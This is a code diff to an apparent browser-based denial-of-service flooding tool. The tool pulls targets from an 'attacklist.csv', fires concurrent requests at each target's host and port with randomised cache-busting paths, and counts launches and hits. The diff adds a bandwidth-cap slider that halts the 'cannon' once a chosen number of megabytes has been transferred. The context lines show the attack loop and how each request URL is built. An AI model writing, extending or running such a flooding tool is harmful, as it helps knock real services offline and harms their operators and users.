@@ -6,12 +6,18 @@
     btnStop: document.getElementById("btnStop"),
     counter: document.getElementById("txtCounter"),
     stats: document.getElementById("txtStats"),
+    mbInput: document.querySelector("#mbInput input"),
+    mbVal: document.querySelector("#mbInput .val"),
   };
 
   var counter = {
     total: 0,
     hit: 0,
   };
+
+  var inputs = {
+    mb: elements.mbInput.mbVal
+  }
 
   var stats = {
     bytes: {
@@ -26,12 +32,23 @@
   var isActive = false
 
   function refreshCounter() {
-    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
+    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>, Size: <strong>${getTotalTransferMb().toFixed(1)} MB</strong>`;
+  }
+
+  function renderInput() {
+    elements.mbVal.innerHTML = !inputs.mb ? 'Unlimited' : `${inputs.mb} MB`
   }
 
   function refreshStats() {
     elements.stats.innerHTML = JSON.stringify(stats, null, 2)
   }
+
+  function mbInputChange() {
+    inputs.mb = elements.mbInput.value == 100 ? null : elements.mbInput.value
+    renderInput()
+  }
+  elements.mbInput.addEventListener('input', mbInputChange)
+  mbInputChange()
 
   window.getTargets = function (cb) {
     fetch("/attacklist.csv").then((res) => {
@@ -95,6 +112,10 @@
     refreshStats();
   }
 
+  var getTotalTransferMb = function () {
+    return (stats.bytes.total.upload + stats.bytes.total.download) / 1024 / 1024
+  }
+
   window.launchCannon = function (bytes, progressCb, done) {
     var maxConcurrent = getMaxConcurrent();
     elements.btnStart.style.display = "none";
@@ -111,6 +132,10 @@
           var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
           refreshCounter();
 
+          if (inputs.mb !== null && getTotalTransferMb() >= inputs.mb) {
+            stopCannon()
+            return
+          }
 
           var url = `https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`;
           var method = target.method || 'GET';
